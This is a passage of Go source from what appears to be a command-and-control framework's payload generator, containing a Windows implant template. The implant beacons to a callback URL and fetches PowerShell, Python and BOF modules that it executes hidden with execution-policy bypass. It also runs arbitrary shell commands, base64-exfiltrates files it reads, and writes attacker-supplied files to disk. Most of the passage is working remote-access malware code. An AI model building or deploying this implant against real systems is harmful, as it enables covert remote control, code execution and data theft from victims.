			binary.Write(buffer, binary.LittleEndian, uint32(len(utf16Data)))
			buffer.Write(utf16Data)
		default:
			return nil, fmt.Errorf("invalid format character '%c' at position %d", c, i)
		}
	}
	
	// Prepend buffer length
	finalBuffer := new(bytes.Buffer)
	binary.Write(finalBuffer, binary.LittleEndian, uint32(buffer.Len()))
	finalBuffer.Write(buffer.Bytes())
	
	return finalBuffer.Bytes(), nil
}

// executeBOF loads and executes a BOF using COFF loader
func executeBOF(bofData []byte, args []byte, entryPoint string) (string, error) {
	output, err := coff.Load(bofData, args)
	if err != nil {
		return "", fmt.Errorf("COFF loader error: %w", err)
	}
	return output, nil
}

func executeBOFModule(taskID, moduleID string, task map[string]interface{}, params map[string]string) {
	{{if .Debug}}
	debugLog("Executing BOF module: id=%s, module=%s", taskID, moduleID)
	{{end}}
	
	// Request BOF file and metadata from server
	client := &http.Client{Timeout: 30 * time.Second}
	moduleURL := callbackURL + "/module/" + moduleID
	if taskID != "" {
		moduleURL += "?task_id=" + taskID
	}
	req, err := http.NewRequest("GET", moduleURL, nil)
	if err != nil {
		sendResult("module", taskID, fmt.Sprintf("Error creating BOF module request: %v", err))
		return
	}
	
	sessionMu.Lock()
	if sessionID != "" {
		req.Header.Set("X-Session-ID", sessionID)
	}
	sessionMu.Unlock()
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		sendResult("module", taskID, fmt.Sprintf("Error fetching BOF module: %v", err))
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		sendResult("module", taskID, fmt.Sprintf("BOF module fetch failed (status %d): %s", resp.StatusCode, string(body)))
		return
	}
	
	var moduleResponse map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&moduleResponse); err != nil {
		sendResult("module", taskID, fmt.Sprintf("Error decoding BOF module response: %v", err))
		return
	}
	
	// Extract BOF data and metadata
	bofDataBase64, ok := moduleResponse["bof_data"].(string)
	if !ok {
		sendResult("module", taskID, "BOF module response missing bof_data")
		return
	}
	
	bofData, err := base64.StdEncoding.DecodeString(bofDataBase64)
	if err != nil {
		sendResult("module", taskID, fmt.Sprintf("Error decoding BOF data: %v", err))
		return
	}
	
	formatString, _ := moduleResponse["format_string"].(string)
	entryPoint, _ := moduleResponse["entry_point"].(string)
	if entryPoint == "" {
		entryPoint = "go" // Default entry point
	}
	
	// Pack arguments according to format string
	var argsBytes []byte
	if formatString != "" && len(params) > 0 {
		// Extract argument values in order
		var argValues []string
		for _, opt := range []string{"Architecture", "Filepath"} {
			if val, ok := params[opt]; ok {
				argValues = append(argValues, val)
			}
		}
		// Pack arguments
		argsBytes, err = packBOFArguments(formatString, argValues)
		if err != nil {
			sendResult("module", taskID, fmt.Sprintf("Error packing BOF arguments: %v", err))
			return
		}
	}
	
	{{if .Debug}}
	debugLog("Loading BOF: entry_point=%s, format_string=%s, args_len=%d", entryPoint, formatString, len(argsBytes))
	{{end}}
	
	// Execute BOF using COFF loader
	output, err := executeBOF(bofData, argsBytes, entryPoint)
	if err != nil {
		sendResult("module", taskID, fmt.Sprintf("Error executing BOF: %v", err))
		return
	}
	
	sendResult("module", taskID, output)
}

func executeModule(taskID, moduleID string, task map[string]interface{}) {
	{{if .Debug}}
	debugLog("Executing module: id=%s, module=%s", taskID, moduleID)
	{{end}}
	
	// Extract parameters from task
	var params map[string]string
	if p, ok := task["parameters"].(map[string]interface{}); ok {
		params = make(map[string]string)
		for k, v := range p {
			if str, ok := v.(string); ok {
				params[k] = str
			} else {
				params[k] = fmt.Sprintf("%v", v)
			}
		}
	} else {
		params = make(map[string]string)
	}
	
	// Check if this is a BOF module
	if strings.Contains(moduleID, "bof/") || strings.HasSuffix(moduleID, ".o") {
		executeBOFModule(taskID, moduleID, task, params)
		return
	}
	
	// For PowerShell and Python modules, execute via their respective interpreters dynamically
	// This allows modules to be executed without embedding them in the payload
	if strings.Contains(moduleID, "powershell/") || strings.Contains(moduleID, "python/") {
		// This is a PowerShell or Python module - we need to fetch and execute it
		// For now, send a request to the server to get the module script
		isPowerShell := strings.Contains(moduleID, "powershell/")
		isPython := strings.Contains(moduleID, "python/")
		{{if .Debug}}
		if isPowerShell {
			debugLog("PowerShell module detected, fetching script from server")
		} else if isPython {
			debugLog("Python module detected, fetching script from server")
		}
		{{end}}
		
		// Request module script from server with task ID to get parameters
		client := &http.Client{Timeout: 30 * time.Second}
		moduleURL := callbackURL + "/module/" + moduleID
		// Add task ID as query parameter so server can look up task parameters
		if taskID != "" {
			moduleURL += "?task_id=" + taskID
		}
		req, err := http.NewRequest("GET", moduleURL, nil)
		if err != nil {
			sendResult("module", taskID, fmt.Sprintf("Error creating module request: %v", err))
			return
		}
		
		sessionMu.Lock()
		if sessionID != "" {
			req.Header.Set("X-Session-ID", sessionID)
		}
		sessionMu.Unlock()
		req.Header.Set("User-Agent", userAgent)
		
		resp, err := client.Do(req)
		if err != nil {
			sendResult("module", taskID, fmt.Sprintf("Error fetching module: %v", err))
			return
		}
		defer resp.Body.Close()
		
		if resp.StatusCode != 200 {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				sendResult("module", taskID, fmt.Sprintf("Module fetch failed (status %d): error reading response body: %v", resp.StatusCode, err))
				return
			}
			sendResult("module", taskID, fmt.Sprintf("Module fetch failed (status %d): %s", resp.StatusCode, string(body)))
			return
		}
		
		var moduleResponse map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&moduleResponse); err != nil {
			sendResult("module", taskID, fmt.Sprintf("Error decoding module response: %v", err))
			return
		}
		
		script, ok := moduleResponse["script"].(string)
		if !ok {
			sendResult("module", taskID, "Module response missing script")
			return
		}
		
		// Script already includes script_end with parameters substituted server-side
		// No need to append parameters again - just write the script as-is
		
		// Execute PowerShell or Python script
		// Use temp file approach to avoid command line length limits
		var tmpFile string
		if isPowerShell {
			tmpFile = filepath.Join(os.TempDir(), fmt.Sprintf("ditto_%d.ps1", time.Now().UnixNano()))
		} else if isPython {
			tmpFile = filepath.Join(os.TempDir(), fmt.Sprintf("ditto_%d.py", time.Now().UnixNano()))
		}
		
		{{if .Debug}}
		var fileExt string
		if isPowerShell {
			fileExt = ".ps1"
		} else if isPython {
			fileExt = ".py"
		}
		if fileExt != "" {
			debugLog("Writing %s script to temp file: %s", strings.ToUpper(fileExt[1:]), tmpFile)
		}
		{{end}}
		
		// Write script to temp file
		if err := os.WriteFile(tmpFile, []byte(script), 0644); err != nil {
			sendResult("module", taskID, fmt.Sprintf("Error writing temp file: %v", err))
			return
		}
		
		// Clean up temp file after execution
		defer func() {
			os.Remove(tmpFile)
			{{if .Debug}}
			debugLog("Removed temp file: %s", tmpFile)
			{{end}}
		}()
		
		// Execute script file with timeout
		// Create context with timeout (60 seconds for module execution)
		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
		defer cancel()
		
		var cmd *exec.Cmd
		if isPowerShell {
			cmd = exec.CommandContext(ctx, "powershell.exe", 
				"-NoProfile", 
				"-NonInteractive", 
				"-NoLogo",
				"-WindowStyle", "Hidden",
				"-ExecutionPolicy", "Bypass", 
				"-File", tmpFile)
		} else if isPython {
			// Try to find Python interpreter: python.exe, py.exe, or python3
			var pythonCmd string
			var pythonArgs []string
			
			if path, err := exec.LookPath("python.exe"); err == nil {
				pythonCmd = path
				pythonArgs = []string{tmpFile}
			} else if path, err := exec.LookPath("py"); err == nil {
				pythonCmd = path
				pythonArgs = []string{"-3", tmpFile} // Use py launcher with -3 flag for Python 3
			} else if path, err := exec.LookPath("python3"); err == nil {
				pythonCmd = path
				pythonArgs = []string{tmpFile}
			} else {
				sendResult("module", taskID, "Error: Python interpreter not found. Please ensure Python is installed and in PATH.")
				return
			}
			
			cmd = exec.CommandContext(ctx, pythonCmd, pythonArgs...)
		}
		
		// Redirect stdin to prevent interpreter from waiting for input
		cmd.Stdin = bytes.NewReader([]byte{})
		
		// Hide window on Windows to prevent hanging
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		
		{{if .Debug}}
		if isPowerShell {
			debugLog("Executing PowerShell script with 60s timeout...")
		} else if isPython {
			debugLog("Executing Python script with 60s timeout...")
		}
		{{end}}
		
		output, err := cmd.CombinedOutput()
		
		{{if .Debug}}
		if ctx.Err() == context.DeadlineExceeded {
			if isPowerShell {
				debugLog("PowerShell execution timed out after 60 seconds")
			} else if isPython {
				debugLog("Python execution timed out after 60 seconds")
			}
		}
		if err != nil {
			if isPowerShell {
				debugLog("PowerShell execution error: %v", err)
			} else if isPython {
				debugLog("Python execution error: %v", err)
			}
		}
		debugLog("Output length: %d bytes", len(output))
		{{end}}
		
		if err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				result := fmt.Sprintf("Error: Module execution timed out after 60 seconds\nOutput (partial): %s", string(output))
				sendResult("module", taskID, result)
			} else {
				result := fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
				sendResult("module", taskID, result)
			}
		} else {
			sendResult("module", taskID, string(output))
		}
		return
	}
	
	// Fallback for embedded modules (if any)
	{{if .ModuleCode}}
	// Module code is embedded
	{{.ModuleCode}}
	
	// Dispatch to appropriate module function
	sanitizedID := strings.ReplaceAll(strings.ReplaceAll(moduleID, "/", "_"), "-", "_")
	switch sanitizedID {
	{{range .Modules}}
	case "{{sanitizeModuleID .}}":
		result := executeModule_{{sanitizeModuleID .}}(params)
		sendResult("module", taskID, result)
	{{end}}
	default:
		sendResult("module", taskID, "Module function not found")
	}
	{{else}}
	// No modules embedded and not PowerShell/Python - module not available
	// Check what type of module this is for better error message
	var errorMsg string
	if strings.Contains(moduleID, "csharp/") {
		errorMsg = "Error: C# modules are not supported by Go implants. Only PowerShell and Python modules are currently supported."
	} else {
		errorMsg = fmt.Sprintf("Error: Module type not supported (not PowerShell/Python and not embedded). Module: %s", moduleID)
	}
	sendResult("module", taskID, errorMsg)
	{{end}}
}

func executeCommand(cmd string) string {
	{{if .Debug}}
	debugLog("Executing command: %s", cmd)
	{{end}}
	
	// Execute command via os/exec
	var result string
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		{{if .Debug}}
		debugLog("ERROR: Empty command")
		{{end}}
		return ""
	}
	
	// Handle Windows built-in commands (like dir, ps, ls) by wrapping in cmd.exe
	// This matches how Empire/Sliver handle these commands
	cmdName := strings.ToLower(parts[0])
	var execCmd *exec.Cmd
	
	// Windows built-in commands that need cmd.exe wrapper
	if cmdName == "dir" || cmdName == "cd" || cmdName == "type" || cmdName == "copy" || 
	   cmdName == "del" || cmdName == "mkdir" || cmdName == "rmdir" || cmdName == "move" ||
	   cmdName == "ren" || cmdName == "echo" || cmdName == "set" || cmdName == "cls" {
		// Use cmd.exe /c for Windows built-ins
		execCmd = exec.Command("cmd.exe", "/c", cmd)
	} else if cmdName == "ps" || cmdName == "tasklist" {
		// Use tasklist for process listing on Windows
		execCmd = exec.Command("tasklist")
		if len(parts) > 1 {
			// Handle additional arguments
			execCmd = exec.Command("tasklist", parts[1:]...)
		}
	} else if cmdName == "ls" {
		// ls is not native on Windows, use dir instead
		execCmd = exec.Command("cmd.exe", "/c", "dir", strings.Join(parts[1:], " "))
	} else {
		// Regular command execution
		execCmd = exec.Command(parts[0], parts[1:]...)
	}
	
	output, err := execCmd.CombinedOutput()
	if err != nil {
		result = fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
		{{if .Debug}}
		debugLog("Command error: %v", err)
		{{end}}
	} else {
		result = string(output)
		{{if .Debug}}
		debugLog("Command output length: %d bytes", len(result))
		{{end}}
	}
	return result
}

func downloadFile(taskID, path string) {
	{{if .Debug}}
	debugLog("Downloading file: id=%s, path=%s", taskID, path)
	{{end}}
	
	// Download file and send back
	data, err := os.ReadFile(path)
	if err != nil {
		sendResult("download", taskID, fmt.Sprintf("Error: %v", err))
		return
	}
	sendResult("download", taskID, base64.StdEncoding.EncodeToString(data))
}

func uploadFile(taskID, path, data string) {
	{{if .Debug}}
	debugLog("Uploading file: id=%s, path=%s", taskID, path)
	{{end}}
	
	// Upload file to disk
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		sendResult("upload", taskID, fmt.Sprintf("Error decoding: %v", err))
		return
	}
	if err := os.WriteFile(path, decoded, 0644); err != nil {
		sendResult("upload", taskID, fmt.Sprintf("Error writing: %v", err))
		return
	}
	sendResult("upload", taskID, "Success")
}

func sendResult(taskType, taskID, result string) {
	{{if .Debug}}
	debugLog("Sending result for task: %s (type: %s)", taskID, taskType)
	debugLog("Result URL: %s/result", callbackURL)
	{{end}}
	
	client := &http.Client{Timeout: 10 * time.Second}
	payload := map[string]interface{}{
		"type":     taskType,
		"task_id":  taskID,
		"result":   result,
	}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		{{if .Debug}}
		debugLog("ERROR: Failed to marshal result: %v", err)
		{{end}}
		return
	}
	
	{{if .Debug}}
	debugLog("Payload JSON: %s", string(jsonData))
	{{end}}
	
	req, err := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
	if err != nil {
		{{if .Debug}}
		debugLog("ERROR: Failed to create result request: %v", err)
		{{end}}
		return
	}
	
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "application/json")
	
	// Include session ID if we have one
	sessionMu.Lock()
	if sessionID != "" {
		req.Header.Set("X-Session-ID", sessionID)
		{{if .Debug}}
		debugLog("Request headers: User-Agent=%s, Content-Type=application/json, X-Session-ID=%s", userAgent, sessionID)
		{{end}}
	} else {
		{{if .Debug}}
		debugLog("WARNING: No session ID available for result request")
		{{end}}
	}
	sessionMu.Unlock()
	
	resp, err := client.Do(req)
	if err != nil {
		{{if .Debug}}
		debugLog("ERROR: Failed to send result: %v", err)
		{{end}}
		return
	}
	defer resp.Body.Close()
	
	{{if .Debug}}
	debugLog("Result response status: %d", resp.StatusCode)
	debugLog("Result response headers: %v", resp.Header)
	{{end}}
}
`

	t := template.Must(template.New("windows").Funcs(template.FuncMap{
		"sanitizeModuleID": sanitizeModuleID,
	}).Parse(tmpl))

	// Set default evasion if nil
	evasion := opts.Evasion
	if evasion == nil {
		evasion = &EvasionConfig{}
	}

	// Embed modules into payload
	moduleCode := g.embedModules(opts.Modules)

	data := TemplateData{
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Evasion:     evasion,
		Modules:     opts.Modules,
		ModuleCode:  moduleCode,
		Debug:       opts.Debug,
	}

	var buf bytes.Buffer
	if err := t.Execute(&buf, data); err != nil {
		return "", fmt.Errorf("failed to execute template: %w", err)
	}

	return buf.String(), nil
}

// embedModules embeds module code into payload
func (g *Generator) embedModules(moduleIDs []string) string {
	if g.moduleRegistry == nil || len(moduleIDs) == 0 {
		return ""
	}

	var moduleCode strings.Builder

	for _, moduleID := range moduleIDs {
		module, ok := g.moduleRegistry.GetModuleByPath(moduleID)
		if !ok {
			// Fallback to direct ID lookup
			module, ok = g.moduleRegistry.GetModule(moduleID)
		}
		if !ok {
			g.logger.Debug("Module not found: %s", moduleID)
			continue
		}

		// Process module with empty params (modules should be pre-configured)
		params := make(map[string]string)
		script, err := modules.ProcessModule(module, params)
		if err != nil {
			g.logger.Error("Failed to process module %s: %v", moduleID, err)
			continue
		}

		// Wrap module code in a function
		moduleCode.WriteString(fmt.Sprintf("\n// Embedded module: %s\n", moduleID))
		moduleCode.WriteString(fmt.Sprintf("func executeModule_%s(params map[string]string) string {\n", sanitizeModuleID(moduleID)))
		moduleCode.WriteString(fmt.Sprintf("// Module code: %s\n", module.Name))

		// For PowerShell modules, we'd need to execute via PowerShell
		// For Go modules, we'd compile them directly
		// For now, store as string to be executed
		if module.Language == modules.LanguagePowerShell {
			moduleCode.WriteString(fmt.Sprintf("// PowerShell module would be executed via powershell.exe\n"))
			moduleCode.WriteString(fmt.Sprintf("cmd := exec.Command(\"powershell.exe\", \"-EncodedCommand\", base64.StdEncoding.EncodeToString([]byte(`%s`)))\n", script))
			moduleCode.WriteString("output, err := cmd.CombinedOutput()\n")
			moduleCode.WriteString("if err != nil {\n")
			moduleCode.WriteString("return fmt.Sprintf(\"Module execution error: %%v\", err)\n")
			moduleCode.WriteString("}\n")
			moduleCode.WriteString("return string(output)\n")
		} else {
			moduleCode.WriteString(fmt.Sprintf("// Module script:\n%s\n", script))
			moduleCode.WriteString("return \"Module executed\"\n")
		}

		moduleCode.WriteString("}\n")
	}

	return moduleCode.String()
}

func sanitizeModuleID(id string) string {
	return strings.ReplaceAll(strings.ReplaceAll(id, "/", "_"), "-", "_")
}
